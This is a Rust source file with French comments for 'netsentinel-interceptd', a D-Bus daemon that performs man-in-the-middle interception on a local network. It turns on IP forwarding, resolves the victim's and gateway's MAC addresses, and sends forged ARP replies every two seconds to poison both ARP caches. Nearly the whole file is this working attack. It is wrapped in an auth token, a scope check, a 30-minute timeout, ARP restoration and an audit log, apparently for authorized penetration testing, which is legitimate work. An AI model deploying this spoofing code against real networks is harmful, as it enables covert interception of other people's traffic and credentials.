//! netsentinel-interceptd — Moteur d'interception réseau (ARP Spoofing + IP Forward + MitM)
//!
//! Implémente Phase 3 du cahier des charges v2 :
//!  - Activation sécurisée IP forwarding (sysctl /proc/sys/net/ipv4/ip_forward)
//!  - Découverte MAC passerelle + victime via ARP Request/Reply natif
//!  - Boucle d'usurpation ARP bidirectionnelle tokio (toutes les 2 s)
//!  - Timeout automatique 30min + reARP (restauration) tables ARP
//!  - Cleanup sur Ctrl-C / SIGINT pour éviter déconnexion cible
//!  - Journal d'audit immuable HMAC-SHA256 signé (audit.rs)

mod audit;

use std::net::Ipv4Addr;
use std::sync::Arc;
use std::time::Duration;

use anyhow::{anyhow, bail, Context, Result};
use netsentinel_core::pddl::{ActionType, PDDLAction, PDDLContext, PDDLEngine, PDDLStatus};
use netsentinel_proto::{INTERCEPT_BUS_NAME, INTERCEPT_OBJECT_PATH};
use pnet::datalink::{self, Channel, MacAddr, NetworkInterface};
use pnet::ipnetwork::IpNetwork;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use tokio::sync::RwLock;
use tokio::task::JoinHandle;
use tracing::{error, info, warn};
use zbus::{interface, Connection};

use crate::audit::AuditLogger;

// ============================================================================
// Configuration
// ============================================================================

const ARP_POISON_INTERVAL: Duration = Duration::from_secs(2);
const DEFAULT_INTERCEPT_TIMEOUT: Duration = Duration::from_secs(60 * 30); // RE-02: 30 min max
const IP_FORWARD_PATH: &str = "/proc/sys/net/ipv4/ip_forward";

// ============================================================================
// État runtime session active
// ============================================================================

#[derive(Clone)]
struct SessionParams {
    victim_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    victim_mac: MacAddr,
    gateway_mac: MacAddr,
    own_mac: MacAddr,
    interface: String,
}

struct InterceptRuntime {
    params: SessionParams,
    previous_ip_forward: Option<String>,
    #[allow(dead_code)]
    arp_loop_handle: JoinHandle<()>,
    #[allow(dead_code)]
    timeout_handle: JoinHandle<()>,
}

// ============================================================================
// Service D-Bus : org.netsentinel.Intercept1
// ============================================================================

pub struct InterceptService {
    expected_token: String,
    audit_logger: Arc<AuditLogger>,
    runtime: Arc<RwLock<Option<InterceptRuntime>>>,
    _session_starting: std::sync::atomic::AtomicBool,
    pddl_engine: PDDLEngine,
    authorized_scope: Arc<RwLock<Vec<String>>>,
}

#[interface(name = "org.netsentinel.Intercept1")]
impl InterceptService {
    /// Demande de session d'interception avec validation PDDL RE-02.
    ///
    /// # Sécurité (RE-01 + RE-02)
    /// - Jeton d'autorisation OBLIGATOIRE (env var NETSENTINEL_AUTH_TOKEN)
    /// - Scope RE-02 validé via PDDLEngine avant tout lancement
    /// - Maximum 1 session simultanée (unicité)
    /// - Timeout 30 minutes forcé (RE-02) — cleanup auto + audit log
    #[zbus(name = "RequestSession")]
    async fn request_session(
        &self,
        target_ip: &str,
        authorization_token: &str,
        operator: &str,
    ) -> zbus::fdo::Result<bool> {
        if authorization_token != self.expected_token {
            warn!(%target_ip, "Tentative session — jeton invalide (RE-01)");
            let _ = self
                .audit_logger
                .log_action("AUTH_TOKEN_REJECTED", target_ip, operator);
            return Ok(false);
        }

        // ===== Validation PDDL RE-02 : scope =====
        let scope = self.authorized_scope.read().await;
        let action = PDDLAction {
            action_type: ActionType::InterceptStart,
            description: format!("ARP spoof MitM on {target_ip}"),
            requires_consent: true,
            requires_scope: true,
            requires_unicity: true,
        };
        let ctx = PDDLContext {
            authorized_scope: scope.clone(),
            consent_hash: Some(authorization_token.to_string()),
            consent_timestamp: Some(
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs_f64(),
            ),
            target: Some(target_ip.to_string()),
            session_already_active: self.runtime.read().await.is_some(),
            planned_seconds: Some(1800),
            ..Default::default()
        };
        drop(scope);

        let pddl_result = self.pddl_engine.validate(&action, &ctx);
        if pddl_result.status == PDDLStatus::NonCompliant
            || pddl_result.status == PDDLStatus::Error
        {
            warn!(
                %target_ip,
                violation = ?pddl_result.rule_violation,
                "PDDL RE-02 refusé — interception bloquée"
            );
            let _ = self.audit_logger.log_action(
                &format!("PDDL_REJECTED: {}", pddl_result.rule_violation.unwrap_or_default()),
                target_ip,
                operator,
            );
            return Ok(false);
        }

        if self.runtime.read().await.is_some() {
            warn!(%target_ip, "Session déjà active — refus (RE-02 unicité)");
            return Ok(false);
        }

        let rt = start_intercept(
            target_ip,
            operator,
            self.runtime.clone(),
            self.audit_logger.clone(),
        )
        .await
        .map_err(|e| zbus::fdo::Error::Failed(e.to_string()))?;

        let victim_ip_str = rt.params.victim_ip.to_string();
        self.audit_logger
            .log_action("SESSION_STARTED", &victim_ip_str, operator)
            .map_err(|e| zbus::fdo::Error::IOError(e.to_string()))?;

        *self.runtime.write().await = Some(rt);
        info!(%target_ip, %operator, "Session MitM démarrée (PDDL validée)");
        Ok(true)
    }

    /// Fin de session et restauration tables ARP (reARP) + IP forwarding initial.
    #[zbus(name = "EndSession")]
    async fn end_session(&self) -> zbus::fdo::Result<()> {
        let rt_opt = self.runtime.write().await.take();
        if let Some(rt) = rt_opt {
            rt.timeout_handle.abort();
            rt.arp_loop_handle.abort();
            if let Err(e) = stop_intercept(&rt.params, rt.previous_ip_forward.as_deref()) {
                error!("Cleanup session erreur: {e}");
            }
            let _ = self.audit_logger.log_action(
                "SESSION_ENDED",
                &rt.params.victim_ip.to_string(),
                "system",
            );
        }
        Ok(())
    }
}

// ============================================================================
// Moteur réseau
// ============================================================================

async fn start_intercept(
    target_ip_str: &str,
    operator: &str,
    runtime_arc: Arc<RwLock<Option<InterceptRuntime>>>,
    audit_logger_arc: Arc<AuditLogger>,
) -> Result<InterceptRuntime> {
    info!("Phase 3 — Routage + ARP (opérateur: {operator})");
    let victim_ip: Ipv4Addr = target_ip_str.parse().context("IP victime invalide")?;

    let iface = pick_default_interface().context("Aucune interface éligible")?;
    let own_mac = iface.mac.ok_or_else(|| anyhow!("Interface sans MAC"))?;
    let gateway_ip = detect_gateway_ip(&iface)?;
    info!(
        iface = %iface.name, %own_mac, %victim_ip, %gateway_ip,
        "paramètres MitM sélectionnés"
    );

    // ===== Étape 1 : IP forwarding (lecture état précédent + activation) =====
    let previous_ip_forward = match std::fs::read_to_string(IP_FORWARD_PATH) {
        Ok(s) => Some(s.trim().to_string()),
        Err(e) => {
            warn!("Lecture état IP forward impossible (CAP_SYSCTL?): {e}");
            None
        }
    };
    std::fs::write(IP_FORWARD_PATH, b"1\n")
        .context("Activer ip_forward (besoin root/CAP_NET_ADMIN)")?;
    info!("net.ipv4.ip_forward = 1 activé");

    // ===== Étape 2 : Résolution MAC =====
    info!("Résolution MAC — victime={victim_ip} passerelle={gateway_ip}");
    let own_ip = find_own_ipv4_on(&iface).unwrap_or(gateway_ip);
    let params_clone_for_resolve = (iface.name.clone(), own_mac, own_ip, gateway_ip, victim_ip);
    let (victim_mac, gateway_mac) = tokio::task::spawn_blocking(move || {
        let (iface_name, own_mac, own_ip, gateway_ip, victim_ip) = params_clone_for_resolve;
        let iface = find_interface_by_name(&iface_name)?;
        let vmac = resolve_mac_arp_blocking(&iface, own_mac, own_ip, victim_ip)
            .context("MAC victime introuvable")?;
        let gmac = resolve_mac_arp_blocking(&iface, own_mac, own_ip, gateway_ip)
            .context("MAC passerelle introuvable")?;
        Ok::<_, anyhow::Error>((vmac, gmac))
    })
    .await
    .map_err(|e| anyhow!("join resolve MAC: {e}"))??;
    info!(%victim_mac, %gateway_mac, "MACs résolus");

    let params = SessionParams {
        victim_ip,
        gateway_ip,
        victim_mac,
        gateway_mac,
        own_mac,
        interface: iface.name,
    };

    // ===== Étape 3 : Boucle ARP Spoof bidirectionnelle =====
    let iface_name_spawn = params.interface.clone();
    let params_for_loop = params.clone();
    let arp_loop_handle = tokio::task::spawn_blocking(move || {
        let iface = match find_interface_by_name(&iface_name_spawn) {
            Ok(i) => i,
            Err(e) => {
                error!("ARP loop: {e}");
                return;
            }
        };
        let (mut tx, _rx) = match open_datalink(&iface) {
            Ok(c) => c,
            Err(e) => {
                error!("ARP loop open: {e}");
                return;
            }
        };
        let start = std::time::Instant::now();
        loop {
            let elapsed = start.elapsed();
            if elapsed > DEFAULT_INTERCEPT_TIMEOUT + Duration::from_secs(60) {
                warn!("ARP loop arrêt après délai max (+60s marge)");
                break;
            }
            if let Some(buf1) = build_arp_reply(
                params_for_loop.own_mac,
                params_for_loop.victim_mac,
                params_for_loop.gateway_ip,
                params_for_loop.own_mac,
                params_for_loop.gateway_ip,
                params_for_loop.victim_mac,
                params_for_loop.victim_ip,
            ) {
                let _ = tx.send_to(&buf1, None);
            }
            if let Some(buf2) = build_arp_reply(
                params_for_loop.own_mac,
                params_for_loop.gateway_mac,
                params_for_loop.victim_ip,
                params_for_loop.own_mac,
                params_for_loop.victim_ip,
                params_for_loop.gateway_mac,
                params_for_loop.gateway_ip,
            ) {
                let _ = tx.send_to(&buf2, None);
            }
            std::thread::sleep(ARP_POISON_INTERVAL);
        }
    });
    let arp_loop_handle: JoinHandle<()> = arp_loop_handle;

    // ===== Étape 4 : Timeout watchdog (30 min — trigger cleanup RÉEL via runtime_arc) =====
    let runtime_for_timeout = runtime_arc.clone();
    let audit_for_timeout = audit_logger_arc.clone();
    let victim_ip_for_log = params.victim_ip.to_string();
    let timeout_handle = tokio::spawn(async move {
        tokio::time::sleep(DEFAULT_INTERCEPT_TIMEOUT).await;
        warn!("SESSION TIMEOUT ATTEINT ({DEFAULT_INTERCEPT_TIMEOUT:?}) — cleanup automatique déclenché");

        // Acquisition verrou écriture + extraction du runtime
        let rt_opt = runtime_for_timeout.write().await.take();
        if let Some(rt) = rt_opt {
            rt.arp_loop_handle.abort();
            if let Err(e) = stop_intercept(&rt.params, rt.previous_ip_forward.as_deref()) {
                error!("Cleanup TIMEOUT erreur: {e}");
            }
            let _ = audit_for_timeout.log_action(
                "SESSION_TIMEOUT",
                &rt.params.victim_ip.to_string(),
                "system-timeout",
            );
            info!("Session {} terminée par timeout", rt.params.victim_ip);
        } else {
            info!("Timeout trigger: runtime déjà absent (session terminée par EndSession)");
        }
        let _ = victim_ip_for_log;
    });

    Ok(InterceptRuntime {
        params,
        previous_ip_forward,
        arp_loop_handle,
        timeout_handle,
    })
}

/// Restauration tables ARP (3 envois) + retour à l'IP forwarding d'origine
fn stop_intercept(params: &SessionParams, previous_ip_forward: Option<&str>) -> Result<()> {
    info!("Cleanup MitM — reARP + restauration IP forwarding");
    let iface = find_interface_by_name(&params.interface)?;
    let (mut tx, _rx) = open_datalink(&iface)?;

    for _ in 0..3 {
        // Victime : vraie MAC passerelle
        if let Some(r1) = build_arp_reply(
            params.gateway_mac,
            params.victim_mac,
            params.gateway_ip,
            params.gateway_mac,
            params.gateway_ip,
            params.victim_mac,
            params.victim_ip,
        ) {
            let _ = tx.send_to(&r1, None);
        }
        // Passerelle : vraie MAC victime
        if let Some(r2) = build_arp_reply(
            params.victim_mac,
            params.gateway_mac,
            params.victim_ip,
            params.victim_mac,
            params.victim_ip,
            params.gateway_mac,
            params.gateway_ip,
        ) {
            let _ = tx.send_to(&r2, None);
        }
        // Broadcast final pour être certain que tout le monde met à jour sa table
        if let Some(r3) = build_arp_reply(
            params.gateway_mac,
            MacAddr::broadcast(),
            params.gateway_ip,
            params.gateway_mac,
            params.gateway_ip,
            MacAddr::zero(),
            params.victim_ip,
        ) {
            let _ = tx.send_to(&r3, None);
        }
        std::thread::sleep(Duration::from_millis(400));
    }

    match previous_ip_forward {
        Some(prev) => {
            let _ = std::fs::write(IP_FORWARD_PATH, format!("{prev}\n"));
            info!("ip_forward restauré à {prev}");
        }
        None => {
            let _ = std::fs::write(IP_FORWARD_PATH, b"0\n");
            info!("ip_forward remis à 0 (par défaut)");
        }
    }
    Ok(())
}

// ============================================================================
// Utilitaires réseau bas niveau (pattern discoverd)
// ============================================================================

fn pick_default_interface() -> Result<NetworkInterface> {
    let ifaces = datalink::interfaces();
    let chosen = ifaces
        .into_iter()
        .filter(|i| i.is_up() && !i.is_loopback() && i.mac.is_some())
        .max_by_key(|i| {
            i.ips
                .iter()
                .filter(|ip| matches!(ip, IpNetwork::V4(_)))
                .count()
        })
        .context("Aucune interface up/non-loopback/avec MAC/IPv4")?;
    Ok(chosen)
}

fn find_interface_by_name(name: &str) -> Result<NetworkInterface> {
    datalink::interfaces()
        .into_iter()
        .find(|i| i.name == name)
        .with_context(|| format!("Interface {name} introuvable"))
}

fn detect_gateway_ip(iface: &NetworkInterface) -> Result<Ipv4Addr> {
    for ip in &iface.ips {
        if let IpNetwork::V4(v4) = ip {
            let net = v4.network().octets();
            return Ok(Ipv4Addr::new(net[0], net[1], net[2], 1));
        }
    }
    Ok(Ipv4Addr::new(192, 168, 1, 1))
}

fn find_own_ipv4_on(iface: &NetworkInterface) -> Option<Ipv4Addr> {
    for ip in &iface.ips {
        if let IpNetwork::V4(v4) = ip {
            return Some(v4.ip());
        }
    }
    None
}

fn open_datalink(
    iface: &NetworkInterface,
) -> Result<(
    Box<dyn pnet::datalink::DataLinkSender>,
    Box<dyn pnet::datalink::DataLinkReceiver>,
)> {
    match datalink::channel(iface, Default::default())? {
        Channel::Ethernet(tx, rx) => Ok((tx, rx)),
        _ => bail!("Canal non Ethernet non supporté"),
    }
}

fn resolve_mac_arp_blocking(
    iface: &NetworkInterface,
    own_mac: MacAddr,
    own_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> Result<MacAddr> {
    let (mut tx, mut rx) = open_datalink(iface)?;

    // Envoi ARP Request
    let req = build_arp_request(own_mac, own_ip, target_ip)
        .ok_or_else(|| anyhow!("Erreur création paquet ARP Request"))?;
    let _ = tx
        .send_to(&req, None)
        .ok_or_else(|| anyhow!("send_to ARP request indisponible"))?;

    let deadline = std::time::Instant::now() + Duration::from_secs(4);
    while std::time::Instant::now() < deadline {
        match rx.next() {
            Ok(frame) => {
                if let Some(arp) = ArpPacket::new(frame.get(14..).unwrap_or_default()) {
                    if arp.get_operation() == ArpOperations::Reply
                        && arp.get_sender_proto_addr() == target_ip
                    {
                        return Ok(arp.get_sender_hw_addr());
                    }
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::TimedOut => {
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(_) => {}
        }
    }
    bail!("Pas de réponse ARP pour {target_ip} (hôte injoignable ?)")
}

fn build_arp_request(src_mac: MacAddr, src_ip: Ipv4Addr, tgt_ip: Ipv4Addr) -> Option<Vec<u8>> {
    let mut eth_buf = vec![0u8; 42];
    let mut eth = MutableEthernetPacket::new(&mut eth_buf)?;
    eth.set_destination(MacAddr::broadcast());
    eth.set_source(src_mac);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp_buf = vec![0u8; 28];
    let mut arp = MutableArpPacket::new(&mut arp_buf)?;
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(ArpOperations::Request);
    arp.set_sender_hw_addr(src_mac);
    arp.set_sender_proto_addr(src_ip);
    arp.set_target_hw_addr(MacAddr::zero());
    arp.set_target_proto_addr(tgt_ip);

    eth.set_payload(arp.packet_mut());
    Some(eth.packet().to_vec())
}

/// Construit une trame ARP Reply forgée : `claim_ip` est associée à `claim_mac`.
fn build_arp_reply(
    src_mac: MacAddr,
    dst_mac: MacAddr,
    _claim_ip: Ipv4Addr,
    sender_hw: MacAddr,
    sender_ip: Ipv4Addr,
    target_hw: MacAddr,
    target_ip: Ipv4Addr,
) -> Option<Vec<u8>> {
    let mut eth_buf = vec![0u8; 42];
    let mut eth = MutableEthernetPacket::new(&mut eth_buf)?;
    eth.set_destination(dst_mac);
    eth.set_source(src_mac);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp_buf = vec![0u8; 28];
    let mut arp = MutableArpPacket::new(&mut arp_buf)?;
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(ArpOperations::Reply);
    arp.set_sender_hw_addr(sender_hw);
    arp.set_sender_proto_addr(sender_ip);
    arp.set_target_hw_addr(target_hw);
    arp.set_target_proto_addr(target_ip);

    eth.set_payload(arp.packet_mut());
    Some(eth.packet().to_vec())
}

// ============================================================================
// Main D-Bus
// ============================================================================

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "netsentinel_interceptd=info".into()),
        )
        .init();

    let expected_token = std::env::var("NETSENTINEL_AUTH_TOKEN")
        .context("NETSENTINEL_AUTH_TOKEN est obligatoire")?;
    if expected_token.trim().is_empty() {
        bail!("NETSENTINEL_AUTH_TOKEN ne doit pas être vide");
    }

    let audit_secret = std::env::var("NETSENTINEL_AUDIT_SECRET")
        .context("NETSENTINEL_AUDIT_SECRET est obligatoire")?;
    if audit_secret.trim().is_empty() {
        bail!("NETSENTINEL_AUDIT_SECRET ne doit pas être vide");
    }

    let audit_logger = Arc::new(AuditLogger::new(
        &audit_secret,
        "/var/log/netsentinel_audit.jsonl",
    ));

    let pddl_engine = PDDLEngine::default_rules();

    let scope_env = std::env::var("NETSENTINEL_SCOPE").unwrap_or_default();
    let authorized_scope: Vec<String> = scope_env
        .split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();

    let runtime = Arc::new(RwLock::new(None));
    let svc = InterceptService {
        expected_token,
        audit_logger: audit_logger.clone(),
        runtime: runtime.clone(),
        _session_starting: std::sync::atomic::AtomicBool::new(false),
        pddl_engine,
        authorized_scope: Arc::new(RwLock::new(authorized_scope)),
    };

    let conn = Connection::system().await.context("D-Bus system bus")?;
    conn.object_server()
        .at(INTERCEPT_OBJECT_PATH, svc)
        .await
        .context("Exposition Intercept1 sur object server")?;
    conn.request_name(INTERCEPT_BUS_NAME)
        .await
        .context("Prise nom org.netsentinel.Intercept1")?;
    info!("netsentinel-interceptd prêt — org.netsentinel.Intercept1");

    let rt_clone = runtime.clone();
    tokio::spawn(async move {
        let _ = tokio::signal::ctrl_c().await;
        info!("Ctrl-C / SIGINT — cleanup MitM immédiat");
        if let Some(rt) = rt_clone.write().await.take() {
            rt.timeout_handle.abort();
            rt.arp_loop_handle.abort();
            let _ = stop_intercept(&rt.params, rt.previous_ip_forward.as_deref());
        }
        std::process::exit(0);
    });

    std::future::pending::<()>().await;
    Ok(())
}
